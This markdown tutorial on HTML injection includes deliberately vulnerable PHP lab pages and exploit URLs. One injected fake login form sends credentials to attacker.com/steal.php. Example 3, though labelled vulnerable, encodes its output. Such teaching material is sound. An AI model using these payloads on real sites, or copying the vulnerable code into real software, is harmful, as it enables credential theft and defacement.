
# ğŸ›¡ï¸ HTML Injection Vulnerability

## ğŸ” What is HTML Injection?

**HTML Injection** is a web vulnerability that occurs when an application embeds user input directly into the **HTML structure** of a webpage **without proper sanitization or encoding**.

This allows attackers to **inject arbitrary HTML tags or content**, which the browser will interpret and render as part of the page.

---

## âš™ï¸ How Does HTML Injection Happen?

HTML Injection occurs when a web application:

* Takes **untrusted user input** (e.g., from query parameters, form fields, or headers).
* Inserts it into the **HTML output** without encoding **special HTML characters**.

---

## âš ï¸ Example of Vulnerable Code

```php
<?php
if (isset($_REQUEST['user'])) {
    echo "<h2>" . $_REQUEST['user'] . "</h2>";
}
?>
```

### ğŸ’¥ Exploit Example:

```url
http://192.168.1.45/webpentest/html-injection.php?user=<iframe src='http://malicious.com'></iframe>
```

---

## ğŸ’¥ Consequences of HTML Injection

* ğŸ¨ **Page Defacement** â€“ Modify the look and feel of the site
* ğŸ£ **Phishing** â€“ Fake login forms or popups
* ğŸ§  **User Manipulation** â€“ Trick users with misleading or fake content
* ğŸ¯ **Browser Exploitation** â€“ Trigger browser-specific bugs or redirection

---

## ğŸ’£ Common Attack Scenarios

| Context        | Example Payload                                            | Impact                                |
| -------------- | ---------------------------------------------------------- | ------------------------------------- |
| GET/POST input | `?user=<h1>Hacked</h1>`                                    | Injects fake headers                  |
| Form Field     | `<input name='name' value="<?php echo $_GET['name']; ?>">` | Breaks HTML rendering                 |
| URL Params     | `<iframe src="<?php echo $_GET['uri']; ?>"></iframe>`      | Loads malicious site                  |
| HTTP Headers   | `User-Agent: <img src=x onerror=alert(1)>`                 | Executes JavaScript (XSS-like attack) |

---

## â— Why Is HTML Injection Dangerous?

* ğŸ” **Trust Exploitation** â€“ Hijacks trust in legitimate web content
* ğŸ•µï¸â€â™‚ï¸ **Credential Theft** â€“ Harvests usernames/passwords via phishing
* ğŸ§¬ **DOM Manipulation** â€“ Modifies structure or logic of the page
* ğŸ§¨ **Script Execution** â€“ Often a stepping stone to XSS

---

## âœ… Prevention Techniques

* ğŸ”’ **Sanitize User Input**
  Strip or encode characters like `<`, `>`, `"`, `'`, etc.

* ğŸ§¼ **Context-Aware Encoding**
  Use functions like:

  ```php
  htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
  ```

* âœ… **Whitelist Valid Inputs**
  Accept only predefined/safe values in forms and URLs

* ğŸš« **Avoid Direct Insertion**
  Never insert raw user input directly into HTML, attributes, or script sections

---
## ğŸ”— References (Updated + Verified)

* ğŸ§ª [OWASP WSTG: Testing for HTML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection)
* ğŸ§  [HTML Character Reference â€“ W3C](https://dev.w3.org/html5/html-author/charref)
* ğŸ“˜ [University of Miami â€“ HTML Character Reference](https://rabbit.eng.miami.edu/info/htmlchars.html)
---
---

## ğŸ“‹ Basic Login Form Exmple

> Convert to one line for exploitation
```html
<h1>Please Login</h1>
<form action="login.php" method="POST">
    User Name: <input type="text" name="username"><br />
    Password: <input type="password" name="password"><br />
    <input type="submit" value="Login">
</form>
```

---

## ğŸ§ª Vulnerable Example 1 â€” `html-injection.php`

```php
html-injection.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection</title>
</head>
<body>
    <h1>HTML Injection</h1>
    <?php
    if (isset($_REQUEST['user'])) {
        echo "<h2>" . $_REQUEST['user'] . "</h2>";
    }
    ?>
</body>
</html>
```

### ğŸ’¥ Exploit Example:
> Test Inject
```
http://192.168.1.45/webpentest/html-injection.php?user=<h1>Injected!</h1>
```
> Iframe Inject
```php
http://192.168.213.145/webpentest/html-injection.php?user=<iframe src="https://www.armourinfosec.com" width="100%" height="500"></iframe><!--
```
> The Injected text is rendered as HTML.
---

## ğŸ§ª Vulnerable Example 2 â€” `html-injection2.php`

```php
html-injection2.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection 2</title>
</head>
<body>
    <h1>Please Login</h1>
    <form action="#" method="POST">
        <!-- Vulnerable to HTML Injection -->
        <input type="hidden" name="sessionid" value="<?php echo $_REQUEST['sessionid']; ?>">
        Username: <input type="text" name="username"><br />
        Password: <input type="password" name="password"><br />
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

### ğŸ’¥ Exploit Example:

```url
http://192.168.1.45/webpentest/html-injection2.php?sessionid=test
```
> Login Form Inject
```php
http://192.168.213.145/webpentest/html-injection2.php?sessionid="></h1><form action="http://attacker.com/steal.php" method="POST"><input type="text" name="username" placeholder="Username"><br><input type="password" name="password" placeholder="Password"><br><input type="submit" value="Login"></form><!--
```
> Check = F12 -> Elements -> Console OR BURP SUITE -> Repeater -> Response
```url
http://192.168.1.45/webpentest/html-injection2.php?sessionid="><h1>Injected</h1><!--
```
> The input escapes the attribute context and injects HTML.
---

## ğŸ§ª Vulnerable Example 3 â€” `html-injection3.php`
```php
html-injection3.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection 3</title>
</head>
<body>
    <?php
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $user_ipadd = $_SERVER['REMOTE_ADDR'];
    $user_port_no = $_SERVER['REMOTE_PORT'];
    $user_ipadd2 = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : '';
    $user_ipadd3 = isset($_SERVER['HTTP_X_PROXYUSER_IP']) ? $_SERVER['HTTP_X_PROXYUSER_IP'] : '';
    $user_http_referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    ?>

    <h2>User Info</h2>
    <table border="1">
        <tr>
            <th>User Agent</th>
            <th>User IP Address</th>
            <th>Port Number</th>
            <th>HTTP Referer</th>
        </tr>
        <tr>
            <td><?php echo htmlspecialchars($user_agent); ?></td>
            <td><?php echo htmlspecialchars($user_ipadd); ?></td>
            <td><?php echo htmlspecialchars($user_port_no); ?></td>
            <td><?php echo htmlspecialchars($user_http_referer); ?></td>
        </tr>
    </table>

    <br>
    <strong>Forwarded IP:</strong> <?php echo htmlspecialchars($user_ipadd2); ?><br>
    <strong>Proxy User IP:</strong> <?php echo htmlspecialchars($user_ipadd3); ?>
</body>
</html>
```

### ğŸ’¥ Exploit Example:

> Open Burp Suite -> Request tab Change User Agent Value Change -> Send -> Check and Refresh Page
```url
http://192.168.1.45/webpentest/html-injection3.php
```
---


